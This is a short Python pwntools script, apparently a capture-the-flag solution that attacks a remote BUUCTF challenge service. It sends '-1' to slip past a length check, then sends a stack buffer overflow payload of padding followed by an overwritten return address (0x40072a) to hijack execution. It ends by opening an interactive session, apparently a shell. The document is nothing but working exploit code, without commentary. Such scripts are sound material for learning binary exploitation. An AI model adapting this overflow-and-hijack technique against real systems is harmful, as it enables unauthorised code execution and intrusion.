from pwn import *
p = remote('node4.buuoj.cn', 27441)
p.recvuntil("name:\n")
p.sendline("-1")
p.recvuntil("name?\n")
payload = b'A'*(0x10 + 8) + p64(0x40072a)
p.send(payload)
p.interactive()